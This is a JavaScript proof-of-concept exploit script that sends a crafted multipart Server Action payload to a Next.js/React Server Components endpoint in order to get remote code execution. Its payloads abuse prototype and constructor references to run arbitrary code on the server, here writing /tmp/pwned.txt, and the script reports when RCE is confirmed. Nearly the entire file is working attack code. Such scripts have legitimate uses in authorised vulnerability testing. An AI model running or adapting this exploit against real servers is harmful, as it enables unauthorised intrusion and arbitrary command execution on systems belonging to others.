/**
 * Simple test to verify code execution is happening
 * 
 * This creates a file on the server to prove RCE works
 */

const TARGET = process.argv[2] || 'http://localhost:3000';
const ACTION_ID = process.argv[3] || null;

async function testRCE() {
  console.log('[*] Testing for RCE...');
  console.log(`[*] Target: ${TARGET}`);
  
  // Simple payload that creates a file
  // If the file exists after running, we have RCE
  const testCommands = [
    // Try to create a marker file
    `require('fs').writeFileSync('/tmp/pwned.txt','RCE_SUCCESS')`,
    // Or just return a value
    `'RCE_WORKS'`,
    // Simple math to verify execution
    `String(1+1)`,
  ];

  for (const cmd of testCommands) {
    console.log(`\n[*] Testing payload: ${cmd.substring(0, 50)}...`);
    
    const payload = {
      0: {
        status: "resolved_model",
        reason: 0,
        _response: {
          _prefix: `${cmd}//`,
          _formData: {
            get: "$1:then:constructor"
          }
        },
        then: "$1:then",
        value: '{"then":"$B"}'
      },
      1: "$@0"
    };

    const boundary = '----WebKitFormBoundary' + Math.random().toString(36).substring(2);
    
    let body = '';
    body += `--${boundary}\r\n`;
    body += `Content-Disposition: form-data; name="0"\r\n\r\n`;
    body += JSON.stringify(payload[0]) + '\r\n';
    body += `--${boundary}\r\n`;
    body += `Content-Disposition: form-data; name="1"\r\n\r\n`;
    body += '$@0\r\n';
    body += `--${boundary}--\r\n`;

    const headers = {
      'Content-Type': `multipart/form-data; boundary=${boundary}`,
      'Accept': 'text/x-component',
    };
    
    if (ACTION_ID) {
      headers['Next-Action'] = ACTION_ID;
    }

    try {
      const response = await fetch(TARGET, {
        method: 'POST',
        headers,
        body
      });

      const text = await response.text();
      console.log(`    Status: ${response.status}`);
      console.log(`    Response length: ${text.length}`);
      
      if (text.includes('RCE')) {
        console.log(`\n[+] RCE CONFIRMED! Response contains: ${text.match(/RCE\w*/)?.[0]}`);
      }
      
      if (response.status === 500) {
        console.log(`    Response: ${text.substring(0, 200)}`);
      }
      
    } catch (e) {
      console.log(`    Error: ${e.message}`);
    }
  }

  console.log('\n[*] Check if /tmp/pwned.txt exists on the server to confirm RCE');
  console.log('    Run on server: cat /tmp/pwned.txt');
}

testRCE();
